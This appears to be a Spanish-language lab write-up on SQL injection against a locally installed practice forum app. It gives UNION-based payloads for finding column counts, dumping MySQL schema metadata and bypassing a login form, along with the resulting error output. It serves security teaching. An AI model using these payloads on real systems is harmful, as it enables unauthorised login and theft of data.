
## Previo
Tiene que ser con un phpmyadmin antiguo.
Accedemos a phpmyadmin y creamos una base de datos que se llame forum. A continuación importamos forum.sql

## Saber el número de columnas de la tabla que afecta al formulario
Para que una consulta UNION funcione, se deben cumplir dos requisitos clave:
- Las consultas individuales deben devolver el mismo número de columnas.
- Los tipos de datos de cada columna deben ser compatibles entre las consultas individuales.

Cómo determinar del número de columnas requeridas en un ataque UNION de inyección SQL:
- El primer método consiste en inyectar una serie de cláusulas ORDER BY e incrementar el índice de columna especificado hasta que se produzca un error. Por ejemplo, vamos probando hasta que obtengamos un error, en nuestro caso:
  ```
  999' or '1'='1' UNION SELECT * from articulos order by 4 #
  ```

- El segundo método consiste en enviar una serie de cargas útiles de UNION SELECT que especifican un número diferente de valores nulos. Vamos probando:
  ```
  ' UNION SELECT NULL--
  ' UNION SELECT NULL,NULL--
  ' UNION SELECT NULL,NULL,NULL–
  ```
  La aplicación podría devolver este mensaje de error, o simplemente podría devolver un error genérico o ningún resultado. Cuando el número de valores nulos coincide con el número de columnas, la base de datos devuelve una fila adicional en el conjunto de resultados, que contiene valores nulos en cada columna.


## Mostrar los usuarios y contraseñas

### Datos de todas las bases de datos, tablas y columnas de MySQL
Partimos de la consulta del lab  que nos da la información de todas las bases de datos, tablas y columnas de MySQL. **El objetivo es que tenemos que conseguir introducir esta consulta para que nos de la información completa.**

Consulta SQL →
```
select information_Schema.tables.table_schema, information_Schema.columns.table_name, information_Schema.columns.column_name FROM information_Schema.columns, information_Schema.tables WHERE information_Schema.tables.table_name = information_Schema.columns.table_name;#
```

Inyección →
```
999' UNION select null, concat(information_Schema.tables.table_schema,'-->',information_Schema.columns.table_name), information_Schema.columns.column_name FROM information_Schema.columns, information_Schema.tables WHERE information_Schema.tables.table_name = information_Schema.columns.table_name;#
```

## Averiguando el número de columnas de la tabla que usa el login
Es necesario saber el número de columnas que tiene la tabla de la que parte el formulario de login para poder hacer el ataque. Vamos probando metiendo null en la sentencia hasta que deje de dar el error de las diferentes número de columnas:

Inyección →
```
999' UNION select null  FROM information_Schema.columns, information_Schema.tables WHERE information_Schema.tables.table_name = information_Schema.columns.table_name; #
```

Vamos obteniendo errores 
```
Notice: Use of undefined constant forum - assumed 'forum' in C:\xampp\htdocs\foro\libraries\User.php on line 9
Fatal error: Uncaught PDOException: SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns in C:\xampp\htdocs\foro\libraries\Database.php:56 Stack trace: #0 C:\xampp\htdocs\foro\libraries\Database.php(56): PDOStatement->execute() #1 C:\xampp\htdocs\foro\libraries\Database.php(65): Database->execute() #2 C:\xampp\htdocs\foro\libraries\User.php(69): Database->single() #3 C:\xampp\htdocs\foro\login.php(11): User->login('999' UNION sele...', 'd41d8cd98f00b20...') #4 {main} thrown in C:\xampp\htdocs\foro\libraries\Database.php on line 56
```
![](capturas/sql-injection-lab2.png)


Continuamos metiendo null hasta que pase a darnos otro tipo de error o de el resultado esperado, que conseguimos loguearnos:
Inyección →
```
999' UNION select null, null, null, null, null, null, null, null, null FROM information_Schema.columns, information_Schema.tables WHERE information_Schema.tables.table_name = information_Schema.columns.table_name; #
```
![](capturas/sql-injection-lab2-2.png)
![](capturas/sql-injection-lab2-3.png)

Número de columnas de la tabla que se usa en el formulario de login: 9 columnas.

